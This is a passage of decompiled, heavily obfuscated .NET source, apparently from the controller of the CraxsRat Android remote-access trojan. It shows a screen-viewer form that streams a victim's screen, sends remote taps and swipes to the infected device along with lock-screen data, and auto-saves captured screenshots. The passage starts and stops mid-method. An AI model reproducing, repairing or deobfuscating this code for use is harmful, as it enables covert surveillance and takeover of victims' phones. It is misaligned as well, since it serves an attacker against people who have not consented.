        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object[] ParametersObjects = new object[4]
        {
          (object) ((WebViewMonitor) this).Client,
          (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0032747553E + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u003171F742E),
          (object) ((WebViewMonitor) this).classClient
        };
label_2:
        int num1 = 938679076;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~(-((1021849408 ^ -234422055) + ~-341757521 + (-1502205591 - -559546465) - (~num2 - ~~(~1039506759 * -2040043415))) - -811391861 * 1118244316)) % 3U)
          {
            case 0:
              goto label_2;
            case 1:
              goto label_7;
            case 2:
              ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects);
              num1 = (int) num3 * 628093786 ^ -903552436;
              continue;
            default:
              goto label_8;
          }
        }
label_7:
        return;
label_8:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Button5_Click(object sender, EventArgs e)
    {
    }

    private void Button6_Click(object sender, EventArgs e)
    {
    }

    private void Button7_Click(object sender, EventArgs e)
    {
    }

    public void Viewdimiss()
    {
      if (!this.Dismisbtn.InvokeRequired)
        goto label_5;
label_1:
      int num1 = -512445506;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~(-~---814460873 - (num2 ^ ~(~~(746745816 + 379634291) + (-67841811 - 823749162 - (-797322464 - 271783466) - 77184569))) - ~~(1863269117 - 1279193059) - -(-38065449 ^ -320453255)) * 172858301)) % 4U)
        {
          case 0:
            goto label_5;
          case 1:
            // ISSUE: method pointer
            this.Dismisbtn.Invoke((Delegate) new ScreenShoter((object) this, __methodptr(Viewdimiss)));
            num1 = (int) num3 * 541767695 ^ -2026872113;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      this.Dismisbtn.Visible = true;
      num1 = -643778228;
      goto label_2;
    }

    private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
    {
      ((WebViewMonitor) this).ScreenShotFoucs = false;
label_1:
      int num1 = -2077229971;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~(num1 ^ (756067845 + -621362906 * 1149916107 + 537156575 * 754868824 ^ ~-(2031943195 - -2019438189)) - ~855774271 * -1568974095) - ~(253243501 - 521450820))) % 7U)
        {
          case 0:
            ((WebViewMonitor) this).Trakpoint = new List<Point>();
            ((WebViewMonitor) this).Trakpoint.Add(new Point(e.X, e.Y));
            ((WebViewMonitor) this).isclick = false;
            num1 = (int) num2 * 1386255186 ^ 2005516547;
            continue;
          case 1:
            this.Dismisbtn.Visible = false;
            int num3 = e.Button != MouseButtons.Left ? -1321346390 : (num3 = -1772352273);
            num1 = num3 ^ (int) num2 * 1534279511;
            continue;
          case 2:
            ((WebViewMonitor) this).isdown = true;
            num1 = (int) num2 * -1422164549 ^ -2122839054;
            continue;
          case 3:
            this.presstimer.Enabled = true;
            ((WebViewMonitor) this).isclick = true;
            num1 = -2073346980;
            continue;
          case 4:
            goto label_3;
          case 5:
            goto label_1;
          case 6:
            num1 = (int) num2 * 819761764 ^ 1437575904;
            continue;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:;
    }

    private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
    {
      ((WebViewMonitor) this).isdown = false;
label_1:
      int num1 = 1111020139;
      int width;
      int height;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(num1 - -(--1199938860 + (987001428 * -1240985833 - -1394260771) ^ 1345138252 - 1957348122 + (-1461634516 - -584546029) ^ ~(-1277631418 - 1196600271)) ^ ~~(271603743 * ~2026039343)) ^ -778094821)) % 7U)
        {
          case 0:
            height = this.Livepicbox.Height;
            if (!((WebViewMonitor) this).isclick)
            {
              num1 = (int) num2 * -1784114557 ^ -979735517;
              continue;
            }
            goto label_33;
          case 1:
            ((WebViewMonitor) this).Trakpoint.Add(new Point(e.X, e.Y));
            num1 = (int) num2 * -1270140002 ^ -1943877894;
            continue;
          case 2:
            goto label_1;
          case 3:
            width = this.Livepicbox.Width;
            num1 = (int) num2 * 1985632425 ^ -415348684;
            continue;
          case 4:
            if (((WebViewMonitor) this).Swaping)
            {
              num1 = (int) num2 * -1590198333 ^ 748088143;
              continue;
            }
            goto label_23;
          case 5:
            ((WebViewMonitor) this).Swaping = false;
            num1 = (int) num2 * -644106834 ^ -152244386;
            continue;
          default:
            goto label_10;
        }
      }
label_23:
      return;
label_10:
      StringBuilder stringBuilder = new StringBuilder();
      List<Point>.Enumerator enumerator;
      try
      {
        enumerator = ((WebViewMonitor) this).Trakpoint.GetEnumerator();
label_12:
        int num3 = 77552370;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (~(num3 - -(--1199938860 + (987001428 * -1240985833 - -1394260771) ^ 1345138252 - 1957348122 + (-1461634516 - -584546029) ^ ~(-1277631418 - 1196600271)) ^ ~~(271603743 * ~2026039343)) ^ -778094821)) % 5U)
          {
            case 0:
              goto label_12;
            case 1:
              num3 = (int) num4 * -1449749516 ^ -2040495587;
              continue;
            case 2:
              int num5;
              num3 = num5 = enumerator.MoveNext() ? 1037963480 : (num5 = 691442512);
              continue;
            case 3:
              Point current = enumerator.Current;
              Point point = new Point(checked ((int) Math.Round(unchecked ((double) current.X * (double) ((WebViewMonitor) this).ScreenSize.Width / (double) width))), checked ((int) Math.Round(unchecked ((double) current.Y * (double) ((WebViewMonitor) this).ScreenSize.Height / (double) height))));
              stringBuilder.Append(point.ToString() + EXGuarder.\u00317636E44);
              num3 = 525040517;
              continue;
            default:
              goto label_20;
          }
        }
      }
      finally
      {
        enumerator.Dispose();
      }
label_20:
      string[] strArray1 = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      object[] ParametersObjects1 = new object[4]
      {
        (object) ((WebViewMonitor) this).Client,
        (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033545340C + stringBuilder.ToString() + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
        (object) Codes.Encoding().GetBytes(EXGuarder.\u0032F182341),
        (object) ((WebViewMonitor) this).classClient
      };
label_21:
      int num6 = 209414500;
label_22:
      string str1;
      Point point1;
      Point client;
      object[] ParametersObjects2;
      while (true)
      {
        uint num7;
        switch ((num7 = (uint) (~(num6 - -(--1199938860 + (987001428 * -1240985833 - -1394260771) ^ 1345138252 - 1957348122 + (-1461634516 - -584546029) ^ ~(-1277631418 - 1196600271)) ^ ~~(271603743 * ~2026039343)) ^ -778094821)) % 15U)
        {
          case 0:
            goto label_33;
          case 1:
            int num8 = Operators.CompareString(this.combosize.Text, EXGuarder.\u0036C1E5E09, false) == 0 ? -1118222955 : (num8 = -173950166);
            num6 = num8 ^ (int) num7 * 971988752;
            continue;
          case 2:
            ((WebViewMonitor) this).tiks = 0;
            num6 = 104721609;
            continue;
          case 3:
            client = this.Livepicbox.PointToClient(Control.MousePosition);
            num6 = (int) num7 * 600900495 ^ 1269400361;
            continue;
          case 4:
            int num9 = ((WebViewMonitor) this).tiks <= 3 ? -1644487336 : (num9 = 842432230);
            num6 = num9 ^ (int) num7 * -1521009449;
            continue;
          case 5:
            goto label_18;
          case 6:
            string str2 = str1;
            int num10 = point1.X;
            string str3 = num10.ToString();
            string str4 = EXGuarder.\u00317636E44;
            num10 = point1.Y;
            string str5 = num10.ToString();
            str1 = str2 + str3 + str4 + str5;
            string[] strArray2 = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects2 = new object[4]
            {
              (object) ((WebViewMonitor) this).Client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033545340C + str1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray2[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray2[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0032F182341),
              (object) ((WebViewMonitor) this).classClient
            };
            num6 = (int) num7 * 4115244 ^ -573353273;
            continue;
          case 7:
            point1 = new Point(checked ((int) Math.Round(unchecked ((double) client.X * (double) ((WebViewMonitor) this).ScreenSize.Width / (double) width))), checked ((int) Math.Round(unchecked ((double) client.Y * (double) ((WebViewMonitor) this).ScreenSize.Height / (double) height))));
            num6 = 1784420979;
            continue;
          case 8:
            ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects2);
            num6 = (int) num7 * 1170416817 ^ -837482672;
            continue;
          case 9:
            ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects1);
            num6 = (int) num7 * -1985091469 ^ -2132707188;
            continue;
          case 10:
            str1 = EXGuarder.\u0031F757272;
            num6 = (int) num7 * 1678257319 ^ 1353014846;
            continue;
          case 11:
            string[] strArray3 = this.combosize.Text.Split('x');
            ((WebViewMonitor) this).ScreenSize = new Size(Conversions.ToInteger(strArray3[1]), Conversions.ToInteger(strArray3[0]));
            num6 = (int) num7 * -2079087174 ^ 975356745;
            continue;
          case 12:
            this.presstimer.Stop();
            str1 = EXGuarder.\u00314594B0B;
            num6 = (int) num7 * -711488075 ^ -738250023;
            continue;
          case 13:
            goto label_21;
          case 14:
            num6 = (int) num7 * 936007093 ^ -876505561;
            continue;
          default:
            goto label_14;
        }
      }
label_18:
      return;
label_14:
      return;
label_33:
      this.presstimer.Enabled = false;
      num6 = 1671747917;
      goto label_22;
    }

    private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
    {
      if (!((WebViewMonitor) this).isdown)
        return;
label_1:
      int num1 = 974976253;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~(((~(1825236660 - 1373074235) - (1968515327 - 1862968415 - (110940219 - 927688248)) - (--1074973514 + ~2076244719 - (291968607 + 1007880140)) ^ -680750625 * (~-911927543 ^ --734195762) ^ -(959119916 * -186262441)) - num2) * 682237035)) % 6U)
        {
          case 0:
            ((WebViewMonitor) this).isclick = false;
            int num4 = e.X <= 0 ? 628413214 : (num4 = -745909827);
            num1 = num4 ^ (int) num3 * 488168458;
            continue;
          case 1:
            ((WebViewMonitor) this).Trakpoint.Add(new Point(e.X, e.Y));
            num1 = (int) num3 * 2085673738 ^ -2092437936;
            continue;
          case 2:
            int num5 = e.Y <= 0 ? 1876650382 : (num5 = -1731324974);
            num1 = num5 ^ (int) num3 * -1769061927;
            continue;
          case 3:
            goto label_1;
          case 4:
            ((WebViewMonitor) this).Swaping = true;
            num1 = (int) num3 * 932645552 ^ 336947489;
            continue;
          case 5:
            goto label_8;
          default:
            goto label_9;
        }
      }
label_8:
      return;
label_9:;
    }

    private void Button1_Click_2(object sender, EventArgs e)
    {
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsgfnbwq(object sender, EventArgs e)
    {
    }

    private void Autosave_CheckedChanged(object sender)
    {
    }

    [DllImport("user32.dll")]
    public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

    [DllImport("user32.dll")]
    public static extern bool ReleaseCapture();

    private void Panel2_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = 255048625;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (613058699 - -~~(num2 + -~-(-774956005 * 2138654715 ^ 1623422319 - -320469914) ^ -1948760270))) % 4U)
        {
          case 0:
            ScreenShoter.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num3 * -1895667516 ^ -438972105;
            continue;
          case 1:
            goto label_6;
          case 2:
            goto label_1;
          case 3:
            ScreenShoter.ReleaseCapture();
            num1 = (int) num3 * -701203990 ^ 30500444;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void Panel3_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = -1755052933;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~num1 * -1645185827 - (~1906180738 - (-806753918 - 1678237525) * -311372185) - (1592214533 * -891920846 ^ --798450722))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            ScreenShoter.ReleaseCapture();
            ScreenShoter.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num2 * 61896189 ^ 863242325;
            continue;
          case 2:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void Panel4_MouseDown(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
label_1:
      int num1 = 977264159;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~num1 + (-1857905055 - ((2019831362 ^ -1234824479) - 1242334368 + -(1212710122 - 11785482))) ^ ~(-2064612916 ^ 955893114) ^ -2070753310 ^ -1286960036 ^ 1261934029)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            ScreenShoter.ReleaseCapture();
            ScreenShoter.SendMessage(this.Handle, 161, 2, 0);
            num1 = (int) num2 * -1386564942 ^ 755251455;
            continue;
          case 2:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void Button1_Click_3(object sender, EventArgs e)
    {
    }

    public string Clientout(string timeoutmil)
    {
      string[] strArray1 = (timeoutmil + EXGuarder.\u00333451170).Replace(EXGuarder.\u003576E6B63, EXGuarder.\u00369077451).Split(' ');
label_1:
      int num1 = -618055417;
      int index;
      string[] strArray2;
      string str1;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~(num1 - ((-1775928836 ^ 1295948948 + 1967585707) * -2078950239 + (1219620040 - -1826716201 - 1462531399) * 1238680287 ^ -(2073182383 * ((1384912862 ^ -329281976) + --1124495469))))) % 11U)
        {
          case 0:
            strArray2 = strArray1;
            num1 = (int) num2 * 1333746697 ^ 1860478953;
            continue;
          case 1:
            num1 = (int) num2 * 1466693643 ^ 98848789;
            continue;
          case 2:
            goto label_1;
          case 4:
            str2 += Conversions.ToString(Strings.Chr(Convert.ToInt32(str1)));
            num1 = (int) num2 * 1503216271 ^ 2055967392;
            continue;
          case 5:
            index = 0;
            num1 = (int) num2 * -1671802864 ^ 490686526;
            continue;
          case 6:
            int num3;
            num1 = num3 = index < strArray2.Length ? -713454906 : (num3 = -727604367);
            continue;
          case 7:
            checked { ++index; }
            num1 = -2067858279;
            continue;
          case 8:
            str2 = EXGuarder.\u0033C717741;
            num1 = (int) num2 * 623811700 ^ 685319716;
            continue;
          case 9:
            int num4 = str1.Length <= 0 ? -963595748 : (num4 = -290326948);
            num1 = num4 ^ (int) num2 * 621132189;
            continue;
          case 10:
            str1 = strArray2[index];
            num1 = -753035217;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscajhg(object sender, FormClosingEventArgs e)
    {
      this.Name = (string) null;
      if (((WebViewMonitor) this).classClient != null)
      {
        try
        {
          string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          object[] ParametersObjects = new object[4]
          {
            (object) ((WebViewMonitor) this).Client,
            (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033E565D4D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0035A144637 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
            (object) Codes.Encoding().GetBytes(EXGuarder.\u0030F5B7828),
            (object) ((WebViewMonitor) this).classClient
          };
          this.toptitle.Text = EXGuarder.\u0035B5A4135;
label_2:
          int num1 = 1939875317;
          while (true)
          {
            uint num2;
            switch ((num2 = (uint) -~~-num1) % 7U)
            {
              case 0:
                goto label_2;
              case 1:
                this.Livepicbox.Enabled = false;
                num1 = (int) num2 * -843846543 ^ 1365418392;
                continue;
              case 2:
                ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects);
                this.StartButton.Enabled = true;
                this.StopButton.Enabled = false;
                num1 = (int) num2 * 1255005316 ^ 1753073549;
                continue;
              case 4:
                ((WebViewMonitor) this).LIVE = false;
                num1 = (int) num2 * 1487153213 ^ -1959750937;
                continue;
              case 5:
                this.refreshtimer.Stop();
                this.PBS.Value = 0;
                num1 = (int) num2 * -31744117 ^ -110618017;
                continue;
              case 6:
                this.toptitle.Text = EXGuarder.\u003246D2607;
                this.vewpnl.Enabled = false;
                num1 = (int) num2 * -732017831 ^ 1039941726;
                continue;
              default:
                goto label_10;
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
label_10:
      this.Dispose();
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      if (this.Save.Checked)
      {
label_1:
        int num1 = 760279257;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(~(num1 ^ -2015614868 ^ ~(~--165937703 + (-1966664981 * 972168362 ^ ~1517450058))) ^ -1104960588) - --1035778892 - 231205784)) % 3U)
          {
            case 0:
              goto label_1;
            case 2:
              if (!Directory.Exists(((WebViewMonitor) this).DownloadsFolder + EXGuarder.\u0035A10312F))
              {
                num1 = (int) num2 * 1415665433 ^ 368519831;
                continue;
              }
              goto label_7;
            default:
              goto label_6;
          }
        }
label_6:
        Directory.CreateDirectory(((WebViewMonitor) this).DownloadsFolder + EXGuarder.\u0035A10312F);
label_7:
        try
        {
          Image image = this.Livepicbox.Image;
          string[] strArray = new string[8];
          strArray[0] = ((WebViewMonitor) this).DownloadsFolder;
          strArray[1] = EXGuarder.\u00318582C64;
          int num3 = DateTime.Now.Day;
          strArray[2] = num3.ToString();
          strArray[3] = EXGuarder.\u00365605C30;
          num3 = DateTime.Now.Month;
          strArray[4] = num3.ToString();
          strArray[5] = EXGuarder.\u00365605C30;
          num3 = DateTime.Now.Millisecond;
          strArray[6] = num3.ToString();
          strArray[7] = EXGuarder.\u00329412532;
          string filename = string.Concat(strArray);
          image.Save(filename);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
label_9:
          int num4 = 855345365;
          while (true)
          {
            uint num5;
            switch ((num5 = (uint) (~(~(num4 ^ -2015614868 ^ ~(~--165937703 + (-1966664981 * 972168362 ^ ~1517450058))) ^ -1104960588) - --1035778892 - 231205784)) % 3U)
            {
              case 0:
                goto label_9;
              case 1:
                goto label_3;
              case 2:
                ProjectData.ClearProjectError();
                num4 = (int) num5 * -839050571 ^ -424949760;
                continue;
              default:
                goto label_13;
            }
          }
label_3:
          return;
label_13:;
        }
      }
      else
        this.Timer1.Stop();
    }

    private void Refreshtimer_Tick(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).LIVE)
      {
        if (((WebViewMonitor) this).Rnew == 0)
          return;
        try
        {
          if (this.PBS.Value >= this.PBS.Maximum)
            goto label_7;
label_3:
          int num1 = 326675381;
label_4:
          while (true)
          {
            int num2 = num1;
            uint num3;
            switch ((num3 = (uint) -(-((1331654285 ^ -1631510714) - (-1881269195 - 1449389611) - -(-1669446164 * -239856101)) - (num2 - (~-(--1337926472 - (2004817341 - -440700229)) + (-1935962621 * -(2060125275 ^ 22015897) + ((519213195 ^ -1635552613 - 1241647206) - -~-19422304)))))) % 4U)
            {
              case 1:
                goto label_7;
              case 2:
                DrakeUIProcessBar pbs;
                int num4 = checked ((pbs = this.PBS).Value + 1);
                pbs.Value = num4;
                num1 = (int) num3 * 496266093 ^ -346084911;
                continue;
              case 3:
                goto label_3;
              default:
                goto label_10;
            }
          }
label_7:
          this.PBS.Value = 0;
          num1 = -866902345;
          goto label_4;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
label_10:
        ((WebViewMonitor) this).Rnew = 0;
      }
      else
        goto label_15;
label_11:
      int num5 = -904997015;
label_12:
      while (true)
      {
        int num6 = num5;
        uint num7;
        switch ((num7 = (uint) -(-((1331654285 ^ -1631510714) - (-1881269195 - 1449389611) - -(-1669446164 * -239856101)) - (num6 - (~-(--1337926472 - (2004817341 - -440700229)) + (-1935962621 * -(2060125275 ^ 22015897) + ((519213195 ^ -1635552613 - 1241647206) - -~-19422304)))))) % 5U)
        {
          case 0:
            goto label_11;
          case 1:
            goto label_8;
          case 2:
            this.refreshtimer.Enabled = false;
            num5 = (int) num7 * -1449491550 ^ -1109889562;
            continue;
          case 3:
            num5 = (int) num7 * -1310026627 ^ -488905088;
            continue;
          case 4:
            goto label_15;
          default:
            goto label_5;
        }
      }
label_8:
      return;
label_5:
      return;
label_15:
      this.refreshtimer.Stop();
      num5 = 674581309;
      goto label_12;
    }

    public void Done(object[] objs)
    {
      if (!this.toptitle.InvokeRequired)
        goto label_7;
label_1:
      int num1 = 866422963;
label_2:
      ScreenShoter.addLogback method;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((-num1 ^ ~(905130643 * -2055139069)) - ~(1972974528 - -1488921996 + (1747080460 ^ -726530735)) - 1450608902) * -699006759 - 405665698)) % 6U)
        {
          case 0:
            num1 = (int) num2 * 413861119 ^ -76649875;
            continue;
          case 1:
            method = (ScreenShoter.addLogback) new ScreenShoter.Delegatstoper(this.Done);
            num1 = (int) num2 * -1247987623 ^ -308879079;
            continue;
          case 2:
            goto label_7;
          case 3:
            goto label_3;
          case 4:
            this.toptitle.Invoke((Delegate) method, (object) objs);
            num1 = (int) num2 * -1948522851 ^ -1059569252;
            continue;
          case 5:
            goto label_1;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_7:
      this.toptitle.Text = Conversions.ToString(objs[0]);
      num1 = -1536575851;
      goto label_2;
    }

    private void Presstimer_Tick(object sender, EventArgs e)
    {
      // ISSUE: variable of a reference type
      int& local;
      // ISSUE: explicit reference operation
      int num = checked (^(local = ref ((WebViewMonitor) this).tiks) + 1);
      local = num;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsjkhsdawe(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        ((WebViewMonitor) this).classClient.SendMessage(new object[4]
        {
          (object) ((WebViewMonitor) this).Client,
          (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033A5F7377 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u00339081244),
          (object) ((WebViewMonitor) this).classClient
        });
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_3:
        int num1 = 1399939659;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((~-num1 ^ 1448581050) - (-1992378699 * -169921769 ^ -1033993521 ^ 1223733955) ^ 1669320446 * -572436089) * 118909049)) % 3U)
          {
            case 0:
              goto label_3;
            case 1:
              ProjectData.ClearProjectError();
              num1 = (int) num2 * 2086092619 ^ -1173345454;
              continue;
            case 2:
              goto label_7;
            default:
              goto label_8;
          }
        }
label_7:
        return;
label_8:;
      }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxsxaj(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.SKtype.Text, EXGuarder.\u0036B5E6037, false) == 0)
      {
        if (((WebViewMonitor) this).classClient == null)
          return;
        try
        {
          string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
label_3:
          int num1 = 1716506531;
          while (true)
          {
            int num2 = num1;
            uint num3;
            object[] ParametersObjects;
            switch ((num3 = (uint) -((-((1116049077 + 991916047) * -1174275255) - ~(num2 ^ ((-366723624 ^ -1397992650) + 692488431 * 230160278 + ~--527125713) * 1538018137 + (~-35413833 ^ -(-1863965201 * 1004499529 + --474135281)))) * -1177999391 * 997328675)) % 4U)
            {
              case 0:
                goto label_16;
              case 1:
                ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects);
                num1 = (int) num3 * -1224034056 ^ -6293299;
                continue;
              case 2:
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                // ISSUE: reference to a compiler-generated field
                ParametersObjects = new object[4]
                {
                  (object) ((WebViewMonitor) this).Client,
